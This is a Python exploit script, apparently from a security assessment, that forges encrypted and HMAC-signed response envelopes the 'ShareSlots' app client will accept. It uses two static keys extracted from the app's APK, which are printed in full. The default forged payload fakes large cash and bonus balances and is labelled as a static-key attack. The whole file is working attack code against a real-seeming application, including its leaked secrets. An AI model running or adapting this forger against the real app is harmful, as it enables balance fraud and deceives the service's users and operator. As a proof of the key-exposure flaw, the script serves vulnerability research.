#!/usr/bin/env python3
"""Attacker-side forger: builds a response envelope the ShareSlots client will accept,
using ONLY the two keys recovered from the APK. Independent implementation
(pycryptodome) -- deliberately NOT the app's code, so agreement is meaningful."""
import base64, hashlib, hmac, json, os, sys, time
from Crypto.Cipher import AES

# Recovered from GlobalVar via Global.uncompile (verified by round-trip re-encode)
P_K  = "rbK2RR#PFn7H4vu0!EKaElnWQkOcKU_z"   # HMAC-SHA256 key
P_AK = "j39qexkacw7gtnzrnnlwuibjnd494xhw"   # AES-256-GCM key


def forge(plaintext_obj, k=P_K, ak=P_AK, timestamp=None, iv=None, nonce_len=12):
    """Reproduce the exact envelope response-decrypt.js validates."""
    ts = int(time.time()) if timestamp is None else timestamp
    pt = json.dumps(plaintext_obj, separators=(",", ":")).encode()
    iv = iv or os.urandom(nonce_len)
    assert len(iv) == 12, "client hard-requires a 12-byte IV"
    key = ak.encode()                      # client does charCodeAt & 0xff per byte
    c = AES.new(key, AES.MODE_GCM, nonce=iv)
    ct, tag = c.encrypt_and_digest(pt)     # 16-byte tag appended by the client's parser
    data = base64.b64encode(iv + ct + tag).decode()
    # signature = HMAC-SHA256(data + str(timestamp), k)  -- string concat, no separator
    sig = hmac.new(k.encode(), (data + str(ts)).encode(), hashlib.sha256).hexdigest()
    return {"data": data, "timestamp": ts, "signature": sig}


if __name__ == "__main__":
    payload = json.loads(sys.argv[1]) if len(sys.argv) > 1 else {
        "code": 0,
        "cash": 999999.00,
        "bonus": 888888.00,
        "total": {"cash": 999999, "bonus": 888888, "reg": 100, "buy": 200, "bet": 300, "tax": 400},
        "today": {"cash": 5000, "bonus": 5000, "reg": 10, "buy": 20, "bet": 30, "tax": 40},
        "data": [], "msg": "forged by static-key attack",
    }
    env = forge(payload)
    print(json.dumps(env))
